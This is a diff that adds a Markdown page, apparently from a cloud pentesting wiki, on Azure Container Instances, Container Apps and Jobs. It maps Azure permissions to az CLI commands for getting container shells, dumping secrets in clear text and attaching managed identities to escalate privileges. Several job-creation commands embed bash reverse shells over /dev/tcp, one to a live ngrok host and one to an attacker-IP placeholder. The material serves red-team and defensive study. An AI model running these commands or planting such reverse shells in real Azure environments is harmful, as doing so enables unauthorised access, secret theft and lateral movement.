@@ -1,0 +1,202 @@
+# Az - Azure Container Instances, Apps & Jobs Privesc
+
+## Azure Container Instances, Apps & Jobs
+
+Fore more information check:
+
+## ACI
+
+### `Microsoft.ContainerInstance/containerGroups/read`, `Microsoft.ContainerInstance/containerGroups/containers/exec/action`
+
+These permissions allow the user to **execute a command** in a running container. This can be used to **escalate privileges** in the container if it has any managed identity attached. Ofc, it's also possible to access the source code and any other sentitive information storeed inside the container.
+
+To get a shell is as simple as:
+
+```bash
+az container exec --name <container-name> --resource-group <res-group>  --exec-command '/bin/sh'
+```
+
+It's also possible to **read the output** of the container with:
+
+```bash
+az container attach --name <container-name> --resource-group <res-group>
+```
+
+Or get the logs with:
+
+```bash
+az container logs --name <container-name> --resource-group <res-group>
+```
+
+### `Microsoft.ContainerInstance/containerGroups/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`
+
+These permissions allows to **attach a user managed identity** to a container group. This is very useful to escalate privileges in the container.
+
+To attach a user managed identity to a container group:
+
+```bash
+az rest \
+  --method PATCH \
+  --url "/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ContainerInstance/containerGroups/<container-name>?api-version=2021-09-01" \
+  --body '{
+    "identity": {
+      "type": "UserAssigned",
+      "userAssignedIdentities": {
+        "/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-namaged-identity-name>": {}
+      }
+    }
+  }' \
+  --headers "Content-Type=application/json"
+```
+
+### `Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.ContainerInstance/containerGroups/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`
+
+These permission allows to **create or update a container group** with a **user managed identity** attached to it. This is very useful to escalate privileges in the container.
+
+```bash
+az container create \
+  --resource-group <res-group> \
+  --name nginx2 \
+  --image mcr.microsoft.com/oss/nginx/nginx:1.9.15-alpine \
+  --assign-identity "/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-namaged-identity-name>" \
+  --restart-policy OnFailure \
+  --os-type Linux \
+  --cpu 1 \
+  --memory 1.0
+```
+
+Moreover, it's also possible to update an existing container group adding for example the **`--command-line` argument** with a reverse shell.
+
+## ACA
+
+### `Microsoft.App/containerApps/read`, `Microsoft.App/managedEnvironments/read`, `microsoft.app/containerapps/revisions/replicas`, `Microsoft.App/containerApps/revisions/read`, `Microsoft.App/containerApps/getAuthToken/action`
+
+These permissions allow the user to **get a shell** in a runningapplication container. This can be used to **escalate privileges** in the container if it has any managed identity attached. Ofc, it's also possible to access the source code and any other sentitive information storeed inside the container.
+
+```bash
+az containerapp exec --name <app-name> --resource-group <res-group> --command "sh"
+az containerapp debug --name <app-name> --resource-group <res-group>
+
+```
+
+### `Microsoft.App/containerApps/listSecrets/action`
+
+This permission allows to get the **clear text of the secrets** configured inside a container app. Note that secrets can be configured with the clear text of with a link to a key vault (in such case the app will have assigned a managed identity with access over the secrets).
+
+```bash
+az containerapp secret list --name <app-name> --resource-group <res-group>
+az containerapp secret show --name <app-name> --resource-group <res-group> --secret-name <scret-name>
+```
+
+### `Microsoft.App/containerApps/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`
+
+These permissions allows to **attach a user managed identity** to a container app. This is very useful to escalate privileges in the container. Executing this action from the az cli also requires the permission `Microsoft.App/containerApps/listSecrets/action`.
+
+To attach a user managed identity to a container group:
+
+```bash
+az containerapp identity assign -n <app-name> -g <res-group> --user-assigned myUserIdentityName
+```
+
+### `Microsoft.App/containerApps/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`, `Microsoft.App/managedEnvironments/join/action`
+
+These permission allows to **create or update an application container** with a **user managed identity** attached to it. This is very useful to escalate privileges in the container.
+
+```bash
+# Get environments
+az containerapp env list --resource-group Resource_Group_1
+
+# Create app in a an environment
+az containerapp create \
+  --name <app-name> \
+  --resource-group <res-group> \
+  --image mcr.microsoft.com/oss/nginx/nginx:1.9.15-alpine \
+  --cpu 1 --memory 1.0 \
+  --user-assigned <user-asigned-identity-name> \
+  --min-replicas 1 \
+  --command "<reserse shell>"
+```
+
+> [!TIP]
+> Note that with these permisions **other configurations of the app** can be modified which could allow to perform other privesc and post explaoitation attacks depending on the configuration of existing apps.
+
+## Jobs
+
+### `Microsoft.App/jobs/read`, `Microsoft.App/jobs/write`
+
+Although jobs aren’t long‑running like container apps, you can exploit the ability to override the job’s command configuration when starting an execution. By crafting a custom job template (for example, replacing the default command with a reverse shell), you can gain shell access within the container that runs the job.
+
+```bash
+# Retrieve the current job configuration and save its template:
+az containerapp job show --name <job-name> --resource-group <res-group> --output yaml > job-template.yaml
+
+# Edit job-template.yaml to override the command with a reverse shell (or similar payload):
+# For example, change the container’s command to:
+#  - args:
+#      - -c
+#      - bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/18224 0>&1
+#      command:
+#      - /bin/bash
+#      image: mcr.microsoft.com/azureml/minimal-ubuntu22.04-py39-cpu-inference:latest
+
+# Update and wait until the job is triggered (or change ths type to scheduled)
+az containerapp job update --name deletemejob6 --resource-group Resource_Group_1 --yaml /tmp/changeme.yaml
+
+# Start a new job execution with the modified template:
+az containerapp job start --name <job-name> --resource-group <res-group> --yaml job-template.yaml
+```
+
+### `Microsoft.App/jobs/read`, `Microsoft.App/jobs/listSecrets/action`
+
+If you have these permissions you can list all the secrets (first permission) inside a Job container and then read the valus of the secrets configured.
+
+```bash
+az containerapp job secret list --name <job-name> --resource-group <res-group>
+az containerapp job secret show --name <job-name> --resource-group <res-group> --secret-name <secret-name>
+```
+
+### `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`, `Microsoft.App/jobs/write`
+
+If you have permission to modify a job’s configuration, you can attach a user‑assigned managed identity. This identity might have additional privileges (for example, access to other resources or secrets) that can be abused to escalate privileges inside the container.
+
+```bash
+az containerapp job update \
+  --name <job-name> \
+  --resource-group <res-group> \
+  --assign-identity <user-assigned-identity-id>
+```
+
+### `Microsoft.App/managedEnvironments/read`, `Microsoft.App/jobs/write`, `Microsoft.App/managedEnvironments/join/action`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`
+
+If you can create a new Container Apps Job (or update an existing one) and attach a managed identity, you can design the job to execute a payload that escalates privileges. For example, you could create a new job that not only runs a reverse shell but also uses the managed identity’s credentials to request tokens or access other resources.
+
+```bash
+az containerapp job create \
+  --name <new-job-name> \
+  --resource-group <res-group> \
+  --environment <environment-name> \
+  --image mcr.microsoft.com/oss/nginx/nginx:1.9.15-alpine \
+  --user-assigned <user-assigned-identity-id> \
+  --trigger-type Schedule \
+  --cron-expression "*/1 * * * *" \
+  --replica-timeout 1800 \
+  --replica-retry-limit 0 \
+  --command "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'"
+```
+
+> [!TIP]
+> This command will throw and error if you don't have the `Microsoft.App/jobs/read` permission also although the Job will be created.
+
+### `microsoft.app/jobs/start/action`, `microsoft.app/jobs/read`
+
+It looks like with these permissions it should be possibel to start a job. This could be used to start a job with a reverse shell or any other malicious command without needing to modify the configuration of the job.
+
+I haven't managed to make it work but according to the allowed parameters it should be possible.
+
+### Microsoft.ContainerInstance/containerGroups/restart/action
+
+Allows restarting a specific container group within Azure Container Instances.
+
+```bash
+az container restart --resource-group <resource-group> --name <container-instances>
+```
